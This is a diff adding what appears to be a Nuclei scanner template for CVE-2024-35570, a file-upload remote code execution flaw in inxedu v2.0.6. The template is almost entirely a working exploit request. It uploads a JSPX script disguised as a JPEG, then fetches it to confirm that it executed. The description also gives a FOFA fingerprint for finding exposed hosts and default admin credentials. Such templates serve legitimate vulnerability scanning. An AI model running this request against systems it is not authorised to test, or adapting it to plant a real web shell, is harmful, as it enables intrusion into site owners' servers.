@@ -1,0 +1,55 @@
+id: inxedu-gok4-file-upload
+
+info:
+  name: "inxedu gok4 组件文件上传导致远程代码执行漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: icon_hash="500708606"
+          inxedu v2.0.6组件\controllerlmageUploadcontroller.class中存在文件上传漏洞，攻击者可通过构造恶意isp文件实现远程代码执行。
+          http://127.0.0.1:8080/admin/main
+      用户名/密码：admin/111111
+  reference:
+  - CVE-2024-35570
+  tags: inxedu
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /image/gok4?&param=image&fileType=jpg,gif,png,jpeg,jspx&pressText=undefined HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Content-Type: multipart/form-data; boundary=---------------------------1193235141139104622277612664
+    Connection: close
+    Cookie: JSESSIONID=10EC81B49E27265587A446F32099DBE3; inxedulogin_sys_user_=inxedulogin_sys_user_1
+    Upgrade-Insecure-Requests: 1
+
+    -----------------------------1193235141139104622277612664
+    Content-Disposition: form-data; name="uploadfile"; filename="NTest.jspx"
+    Content-Type: image/jpeg
+
+    <jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
+        <jsp:directive.page contentType="text/html;charset=UTF-8" />
+        <jsp:scriptlet>
+            out.println("NdayTest");
+            new java.io.File(application.getRealPath(request.getServletPath())).delete();
+        </jsp:scriptlet>
+    </jsp:root>
+    -----------------------------1193235141139104622277612664--
+- raw:
+  - |
+    GET /NTest.jspx HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
